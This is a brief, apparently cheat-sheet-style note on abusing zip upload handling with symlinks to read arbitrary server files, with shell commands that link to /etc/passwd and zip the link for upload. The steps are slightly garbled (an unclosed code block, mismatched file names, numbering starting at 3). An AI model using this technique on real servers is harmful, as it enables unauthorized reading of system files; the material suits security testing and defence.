If a web application allows `.zip` files to be uploaded and processes its contents by unzipping. An attacker can abuse this functionality by using symlink to read arbitrary files on the server that is running the application.

```bash
$ ln -s /etc/passwd file.pdf

```bash
zip --symlinks upload.zip test.pdf
```
3. Upload the malicious `.zip` file and the application will return its contents
